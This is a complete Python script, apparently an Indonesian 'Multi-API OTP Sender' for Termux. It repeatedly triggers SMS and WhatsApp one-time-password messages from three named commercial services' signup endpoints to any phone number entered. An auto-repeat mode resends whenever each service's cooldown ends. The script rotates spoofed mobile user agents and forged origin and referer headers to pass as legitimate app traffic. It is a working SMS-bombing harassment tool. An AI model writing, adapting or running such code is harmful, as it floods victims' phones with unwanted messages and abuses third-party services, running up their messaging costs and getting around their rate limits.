#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
import sys
import os
import signal
import random
from datetime import datetime

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    from rich.align import Align
    from rich.live import Live
    from rich.columns import Columns
    from rich import box
    from rich.rule import Rule
except ImportError:
    os.system("pip install rich -q")
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    from rich.align import Align
    from rich.live import Live
    from rich.columns import Columns
    from rich import box
    from rich.rule import Rule

console = Console()

# ══════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════

APIS = {
    1: {"name": "Bunda.co.id",  "desc": "SMS",       "tag": "BND",
        "cooldown": 180, "color": "bright_magenta", "method": "bunda"},
    2: {"name": "Paper.id SMS", "desc": "SMS",       "tag": "PPR",
        "cooldown": 30,  "color": "bright_green",   "method": "paper_sms"},
    3: {"name": "PlanetBan",    "desc": "WhatsApp",  "tag": "PLB",
        "cooldown": 60,  "color": "bright_red",     "method": "planetban"},
    4: {"name": "ALL TARGETS",  "desc": "Semua API", "tag": "ALL",
        "cooldown": 0,   "color": "bold cyan",      "method": "all"},
}

UA_POOL = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; POCO X3 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; vivo V25) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OPPO Find X6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; realme GT2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Samsung Galaxy A52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2101K7BG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
]

def rand_ua() -> str:
    return random.choice(UA_POOL)

BANNER = """\
[bold cyan] ██╗████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗
 ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     ╚██╗██╔╝
 ██║   ██║   ██║   ██║██║   ██║██║      ╚███╔╝ 
 ██║   ██║   ██║   ██║██║   ██║██║      ██╔██╗ 
 ██║   ██║   ╚██████╔╝╚██████╔╝███████╗██╔╝ ██╗
 ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝[/bold cyan]"""

# ══════════════════════════════════════════════════════════════
#  STATE
# ══════════════════════════════════════════════════════════════

cooldown_tracker: dict = {}   # { phone: { method: sent_at } }

# ══════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════

def get_rem(phone: str, method: str, cd: int) -> int:
    sent = cooldown_tracker.get(phone, {}).get(method)
    return 0 if sent is None else max(0, int(cd - (time.time() - sent)))

def set_cd(phone: str, method: str):
    cooldown_tracker.setdefault(phone, {})[method] = time.time()

def was_sent(phone: str, method: str) -> bool:
    return method in cooldown_tracker.get(phone, {})

def fmt_rem(s: int) -> str:
    m, sc = divmod(s, 60)
    return f"{m}m{sc:02d}s" if m else f"{sc}s"

def is_ok(code: int) -> bool:
    return code in (200, 201, 202)

def clr():
    os.system("cls" if os.name == "nt" else "clear")

def flush_stdin():
    try:
        import termios
        termios.tcflush(sys.stdin, termios.TCIFLUSH)
    except Exception:
        pass

def validate_phone(raw: str) -> str:
    p = raw.strip().replace(" ", "").replace("-", "")
    if p.startswith("+62"): return "62" + p[3:]
    if p.startswith("08"):  return "628" + p[2:]
    if p.startswith("8"):   return "62" + p
    return p

def status_fmt(code: int):
    if is_ok(code):  return "SUCCESS", "bold green"
    if code == 0:    return "ERROR",   "bold red"
    return f"HTTP {code}", "bold yellow"

def clean_exit():
    clr()
    console.print(Align.center(Panel(
        "[bold white]Sampai jumpa.[/bold white]\n"
        "[dim]ITOOLX  Termux Edition[/dim]",
        border_style="cyan", padding=(1, 4),
    )))
    sys.exit(0)

# ══════════════════════════════════════════════════════════════
#  API FUNCTIONS
# ══════════════════════════════════════════════════════════════

def _h(**extra) -> dict:
    ua = rand_ua()
    base = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Not;A=Brand";v="8","Chromium";v="150","Android WebView";v="150"',
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua-mobile": "?1",
        "accept-language": "id-ID,id;q=0.9",
    }
    base.update(extra)
    return base

def send_bunda(phone: str) -> dict:
    try:
        r = requests.post(
            "https://cms.bunda.co.id/api/v1/auth/send-otp",
            data=json.dumps({"phone_number": int(phone), "type": "auth"}),
            headers=_h(**{
                "Content-Type": "application/json", "x-locale": "id",
                "origin": "https://www.bunda.co.id",
                "x-requested-with": "com.chimbori.hermitcrab",
                "referer": "https://www.bunda.co.id/id/hospitals",
            }), timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def send_paper_sms(phone: str) -> dict:
    try:
        r = requests.post(
            "https://register.paper.id/api/v1/auth/register/send-otp",
            data=json.dumps({"phone": phone, "method": "sms",
                             "registered_by": "flutter mweb"}),
            headers=_h(**{
                "Content-Type": "application/json", "authorization": "",
                "x-paper-user-agent": "multiverse/2.58.1 mobile_web (android) chrome",
                "origin": "https://paper.id",
                "x-requested-with": "com.chimbori.hermitcrab",
                "referer": "https://paper.id/",
            }), timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def send_planetban(phone: str) -> dict:
    num = phone if phone.startswith("62") else "62" + phone.lstrip("0")
    pb  = "0" + num[2:]
    try:
        r = requests.post(
            "https://api.planetban.com/website/customer/request-otp",
            data=json.dumps({"phone": pb, "purpose": "register", "method": "whatsapp"}),
            headers=_h(**{
                "Content-Type": "application/json",
                "origin": "https://planetban.com",
                "x-requested-with": "com.chimbori.hermitcrab",
                "referer": "https://planetban.com/",
            }), timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def dispatch(method: str, phone: str) -> dict:
    if method == "bunda":     return send_bunda(phone)
    if method == "paper_sms": return send_paper_sms(phone)
    if method == "planetban": return send_planetban(phone)
    return {}

# ══════════════════════════════════════════════════════════════
#  MENU
# ══════════════════════════════════════════════════════════════

def render_menu(phone: str = "") -> Table:
    t = Table(
        title=(
            "[bold cyan]PILIH TARGET[/bold cyan]"
            + (f"  [dim]-> {phone}[/dim]" if phone else "")
        ),
        box=box.DOUBLE_EDGE, border_style="cyan",
        header_style="bold cyan", show_lines=True,
    )
    t.add_column("No",  width=4,  justify="center", style="bold white")
    t.add_column("Tag", width=5,  justify="center")
    t.add_column("API", width=16, style="bold")
    t.add_column("Via", width=10)
    t.add_column("CD",  width=9,  justify="center")

    for num, api in APIS.items():
        if api["method"] == "all":
            cd_txt = "[dim]each[/dim]"
        else:
            cd_txt = f"[dim]{api['cooldown']}s[/dim]"

        t.add_row(
            f"[cyan]{num}[/cyan]",
            f"[{api['color']}]{api['tag']}[/{api['color']}]",
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            f"[dim]{api['desc']}[/dim]",
            cd_txt,
        )
    t.add_row("[red]0[/red]", "[red]EXIT[/red]", "[red]Keluar[/red]", "", "")
    return t

def print_home(phone: str = ""):
    clr()
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(
        "[bold white]Multi-API OTP Sender[/bold white]  "
        "[dim]by[/dim] [bold cyan]ITOOLX[/bold cyan]  [dim]Termux Edition[/dim]",
        border_style="cyan", padding=(0, 3),
    )))
    console.print()
    console.print(Align.center(render_menu(phone)))
    console.print()

# ══════════════════════════════════════════════════════════════
#  LIVE COOLDOWN PANEL
# ══════════════════════════════════════════════════════════════

def build_cd_panel(phone: str, targets: list, title: str = "") -> Panel:
    t = Table(
        box=box.SIMPLE, show_header=True, show_lines=False,
        padding=(0, 1), header_style="dim",
    )
    t.add_column("API",      width=16)
    t.add_column("Progress", width=16)
    t.add_column("Sisa",     width=8,  justify="right")
    t.add_column("Unlock",   width=9,  justify="center")
    t.add_column("Status",   width=7,  justify="center")

    for api in targets:
        if api["method"] == "all":
            continue
        rem  = get_rem(phone, api["method"], api["cooldown"])
        sent = cooldown_tracker.get(phone, {}).get(api["method"])
        cd   = api["cooldown"]

        if rem > 0 and sent:
            fill  = max(0, int((cd - rem) / cd * 14))
            bar   = (f"[cyan]{'|' * fill}[/cyan]"
                     f"[dim]{'.' * (14 - fill)}[/dim]")
            sisa  = f"[bold red]{fmt_rem(rem):>6}[/bold red]"
            ul    = datetime.fromtimestamp(sent + cd).strftime("%H:%M:%S")
            stat  = "[red] WAIT [/red]"
        else:
            bar   = "[bold green]" + "|" * 14 + "[/bold green]"
            sisa  = "[bold green]  0s[/bold green]"
            ul    = "[dim]  --   [/dim]"
            stat  = "[bold green] READY [/bold green]"

        t.add_row(
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            bar, sisa, f"[dim]{ul}[/dim]", stat,
        )

    now = datetime.now().strftime("%H:%M:%S")
    hdr = title or f"[bold yellow]COOLDOWN  {phone}[/bold yellow]"
    return Panel(t, title=hdr, subtitle=f"[dim]{now}[/dim]",
                 border_style="yellow", padding=(0, 1))

# ══════════════════════════════════════════════════════════════
#  LIVE CD WAIT
# ══════════════════════════════════════════════════════════════

def wait_until_ready(phone: str, targets: list):
    def any_locked():
        return any(get_rem(phone, a["method"], a["cooldown"]) > 0
                   for a in targets if a["method"] != "all")

    if not any_locked():
        return

    with Live(build_cd_panel(phone, targets),
              console=console, refresh_per_second=2,
              transient=True) as live:
        while any_locked():
            time.sleep(0.5)
            live.update(build_cd_panel(phone, targets))

    flush_stdin()

# ══════════════════════════════════════════════════════════════
#  Y / R / N  PROMPT
# ══════════════════════════════════════════════════════════════

def ask_yrn() -> str:
    flush_stdin()
    console.print(Panel(
        "  [bold cyan]Y[/bold cyan]  Kirim sekali lagi\n"
        "  [bold cyan]R[/bold cyan]  Auto-repeat  (kirim tiap target begitu CD habis)\n"
        "  [bold cyan]N[/bold cyan]  Stop, kembali ke menu",
        title="[bold green]SIAP[/bold green]",
        border_style="green", padding=(0, 2),
    ))
    while True:
        flush_stdin()
        raw = Prompt.ask("[bold cyan]  >[/bold cyan]", default="y").strip().lower()
        if raw in ("y", "r", "n"):
            return raw

# ══════════════════════════════════════════════════════════════
#  RESULT PANELS
# ══════════════════════════════════════════════════════════════

def show_result(api: dict, phone: str, res: dict, round_n: int):
    clr()
    code      = res.get("status", 0)
    body      = res.get("body", "")
    prev      = body[:100].replace("\n", " ") + ("..." if len(body) > 100 else "")
    lbl, col  = status_fmt(code)

    console.print(Align.center(Panel(
        f"  [{api['color']}]{api['tag']}  {api['name']}[/{api['color']}]\n\n"
        f"  [bold white]Nomor  [/bold white] [bright_yellow]{phone}[/bright_yellow]\n"
        f"  [bold white]Round  [/bold white] {round_n}\n"
        f"  [bold white]HTTP   [/bold white] [{col}]{code}   {lbl}[/{col}]\n"
        f"  [bold white]Waktu  [/bold white] [dim]{datetime.now().strftime('%H:%M:%S')}[/dim]\n\n"
        f"  [dim]{prev}[/dim]",
        title=f"[{col}] {lbl} [/{col}]",
        border_style="green" if is_ok(code) else "red",
        padding=(1, 2),
    )))
    console.print()


def show_all_results(phone: str, results: list, round_n: int):
    clr()
    t = Table(
        title=f"[bold cyan]ALL TARGETS   Round {round_n}   {phone}[/bold cyan]",
        box=box.ROUNDED, border_style="cyan",
        header_style="bold cyan", show_lines=True,
    )
    t.add_column("Tag",    width=5,  justify="center")
    t.add_column("API",    width=16)
    t.add_column("HTTP",   width=6,  justify="center")
    t.add_column("Status", width=10)
    t.add_column("Jam",    width=9,  justify="center")

    for item in results:
        lbl, col = status_fmt(item["status"])
        t.add_row(
            f"[{item['color']}]{item['tag']}[/{item['color']}]",
            f"[{item['color']}]{item['name']}[/{item['color']}]",
            f"[{col}]{item['status']}[/{col}]",
            f"[{col}]{lbl}[/{col}]",
            f"[dim]{item['time']}[/dim]",
        )
    console.print(Align.center(t))
    console.print()

# ══════════════════════════════════════════════════════════════
#  R-MODE LIVE PANEL  —  in-place, tidak scroll
# ══════════════════════════════════════════════════════════════

def build_r_panel(phone: str, targets: list, log_rows: list, title: str) -> Panel:
    # ── tabel log kiriman (maks 12 baris terakhir)
    tlog = Table(box=box.SIMPLE, show_header=True, padding=(0, 1),
                 header_style="dim cyan", show_lines=False)
    tlog.add_column("#",      width=3,  justify="right")
    tlog.add_column("Tag",    width=5,  justify="center")
    tlog.add_column("API",    width=14)
    tlog.add_column("Status", width=10)
    tlog.add_column("Jam",    width=9,  justify="center")

    for row in log_rows[-12:]:
        lbl, col = status_fmt(row["status"])
        tlog.add_row(
            f"[dim]{row['round']}[/dim]",
            f"[{row['color']}]{row['tag']}[/{row['color']}]",
            f"[{row['color']}]{row['name']}[/{row['color']}]",
            f"[{col}]{lbl}[/{col}]",
            f"[dim]{row['time']}[/dim]",
        )

    # ── tabel CD bar
    tcd = Table(box=box.SIMPLE, show_header=False, padding=(0, 1),
                show_lines=False)
    tcd.add_column("API",    width=14)
    tcd.add_column("Bar",    width=16)
    tcd.add_column("Sisa",   width=8, justify="right")
    tcd.add_column("Status", width=7, justify="center")

    for api in targets:
        if api["method"] == "all":
            continue
        rem  = get_rem(phone, api["method"], api["cooldown"])
        sent = cooldown_tracker.get(phone, {}).get(api["method"])
        cd   = api["cooldown"]

        if rem > 0 and sent:
            fill = max(0, int((cd - rem) / cd * 14))
            bar  = f"[cyan]{'|'*fill}[/cyan][dim]{'.'*(14-fill)}[/dim]"
            sisa = f"[bold red]{fmt_rem(rem):>6}[/bold red]"
            stat = "[red]WAIT[/red]"
        else:
            bar  = "[bold green]" + "|" * 14 + "[/bold green]"
            sisa = "[bold green]  0s[/bold green]"
            stat = "[bold green]READY[/bold green]"

        tcd.add_row(
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            bar, sisa, stat,
        )

    now  = datetime.now().strftime("%H:%M:%S")
    body = Columns([tlog, tcd], padding=(0, 2))
    return Panel(body, title=title,
                 subtitle=f"[dim]{now}   Ctrl+C = stop[/dim]",
                 border_style="yellow", padding=(0, 1))

# ══════════════════════════════════════════════════════════════
#  SESSION — SINGLE  (Y mode)
# ══════════════════════════════════════════════════════════════

def session_single(api: dict, phone: str):
    round_n = 0

    while True:
        round_n += 1
        with console.status(
            f"[bold cyan]Mengirim  {api['name']}...", spinner="dots",
        ):
            res = dispatch(api["method"], phone)
        set_cd(phone, api["method"])

        show_result(api, phone, res, round_n)

        wait_until_ready(phone, [api])

        ans = ask_yrn()
        if ans == "n":
            return
        if ans == "r":
            session_single_r(api, phone, round_n)
            return

# ══════════════════════════════════════════════════════════════
#  SESSION — SINGLE  (R mode)  — in-place Live
# ══════════════════════════════════════════════════════════════

def session_single_r(api: dict, phone: str, start_round: int):
    round_n  = start_round
    log_rows = []
    title    = f"[bold yellow]AUTO-REPEAT  {api['tag']}  {phone}[/bold yellow]"

    with Live(console=console, refresh_per_second=4, transient=True) as live:
        while True:
            round_n += 1
            live.stop()
            with console.status(
                f"[bold cyan]Auto  {api['name']}  #{round_n}...", spinner="dots",
            ):
                res = dispatch(api["method"], phone)
            set_cd(phone, api["method"])
            live.start()

            log_rows.append({
                "round":  round_n,
                "tag":    api["tag"],
                "color":  api["color"],
                "name":   api["name"],
                "status": res.get("status", 0),
                "time":   datetime.now().strftime("%H:%M:%S"),
            })
            live.update(build_r_panel(phone, [api], log_rows, title))

            while get_rem(phone, api["method"], api["cooldown"]) > 0:
                time.sleep(0.25)
                live.update(build_r_panel(phone, [api], log_rows, title))

# ══════════════════════════════════════════════════════════════
#  SESSION — ALL  (Y mode)
# ══════════════════════════════════════════════════════════════

def session_all(phone: str):
    targets = [v for v in APIS.values() if v["method"] != "all"]
    round_n = 0

    while True:
        round_n += 1
        results = []
        for api in targets:
            with console.status(
                f"[bold cyan]->  {api['name']}...", spinner="aesthetic",
            ):
                t_str = datetime.now().strftime("%H:%M:%S")
                res   = dispatch(api["method"], phone)
                set_cd(phone, api["method"])
            results.append({
                "name":   api["name"], "tag": api["tag"],
                "color":  api["color"],
                "status": res.get("status", 0), "time": t_str,
            })
            time.sleep(0.15)

        show_all_results(phone, results, round_n)

        wait_until_ready(phone, targets)

        ans = ask_yrn()
        if ans == "n":
            return
        if ans == "r":
            session_all_r(phone, targets, round_n)
            return

# ══════════════════════════════════════════════════════════════
#  SESSION — ALL  (R mode)  — in-place Live
# ══════════════════════════════════════════════════════════════

def session_all_r(phone: str, targets: list, initial_round: int = 0):
    round_counts = {a["method"]: initial_round for a in targets}
    pending: set = {a["method"] for a in targets
                    if not was_sent(phone, a["method"])}
    log_rows: list = []
    title = f"[bold yellow]AUTO-REPEAT  ALL  {phone}[/bold yellow]"

    def needs_send(api: dict) -> bool:
        if api["method"] in pending:
            return True
        return (was_sent(phone, api["method"]) and
                get_rem(phone, api["method"], api["cooldown"]) == 0)

    with Live(console=console, refresh_per_second=4, transient=True) as live:
        while True:
            ready = [a for a in targets if needs_send(a)]

            if ready:
                for api in ready:
                    pending.discard(api["method"])
                    round_counts[api["method"]] += 1
                    rn = round_counts[api["method"]]

                    live.stop()
                    with console.status(
                        f"[bold cyan]->  {api['name']}  #{rn}", spinner="dots",
                    ):
                        res = dispatch(api["method"], phone)
                    set_cd(phone, api["method"])
                    live.start()

                    log_rows.append({
                        "round":  rn,
                        "tag":    api["tag"],
                        "color":  api["color"],
                        "name":   api["name"],
                        "status": res.get("status", 0),
                        "time":   datetime.now().strftime("%H:%M:%S"),
                    })
                    time.sleep(0.1)

            live.update(build_r_panel(phone, targets, log_rows, title))
            time.sleep(0.25)

# ══════════════════════════════════════════════════════════════
#  INPUT HELPER
# ══════════════════════════════════════════════════════════════

def ask_phone(current: str = "") -> str:
    hint = (f" [dim](Enter = {current})[/dim]"
            if current else " [dim](08xxx / 628xxx)[/dim]")
    while True:
        flush_stdin()
        raw = Prompt.ask(f"[bold cyan]  >[/bold cyan] Nomor{hint}")
        if raw.strip() == "" and current:
            return current
        p = validate_phone(raw)
        if len(p) >= 10:
            return p
        console.print("[bold red]  Nomor tidak valid.[/bold red]")

# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

def main():
    # Ctrl+C sekali = langsung keluar bersih, tanpa loop balik ke menu
    signal.signal(signal.SIGINT, lambda sig, frm: clean_exit())

    current_phone = ""

    while True:
        print_home(current_phone)

        try:
            flush_stdin()
            raw    = Prompt.ask("[bold cyan]  >[/bold cyan] Pilih  [dim](0 = exit)[/dim]")
            choice = int(raw.strip())
        except (ValueError, EOFError):
            time.sleep(0.3)
            continue

        if choice == 0:
            clean_exit()

        if choice not in APIS:
            time.sleep(0.3)
            continue

        api = APIS[choice]

        # Input nomor
        clr()
        console.print(Align.center(Panel(
            f"[{api['color']}]{api['tag']}  {api['name']}[/{api['color']}]",
            border_style="cyan", padding=(0, 4),
        )))
        console.print()
        current_phone = ask_phone(current_phone)
        console.print()

        # Cek CD awal
        targets = ([v for v in APIS.values() if v["method"] != "all"]
                   if api["method"] == "all" else [api])

        locked = [a for a in targets
                  if get_rem(current_phone, a["method"], a["cooldown"]) > 0]

        if locked:
            console.print(Align.center(
                build_cd_panel(current_phone, targets,
                               title="[bold red]COOLDOWN AKTIF[/bold red]")
            ))
            console.print(
                "\n  [bold cyan]Y[/bold cyan] = Tunggu CD selesai lalu kirim"
                "\n  [bold cyan]N[/bold cyan] = Batal\n"
            )
            flush_stdin()
            ans = Prompt.ask("[bold cyan]  >[/bold cyan]",
                             default="y").strip().lower()
            if ans != "y":
                continue
            wait_until_ready(current_phone, targets)

        # Mulai sesi
        if api["method"] == "all":
            session_all(current_phone)
        else:
            session_single(api, current_phone)

        time.sleep(0.4)


if __name__ == "__main__":
    main()
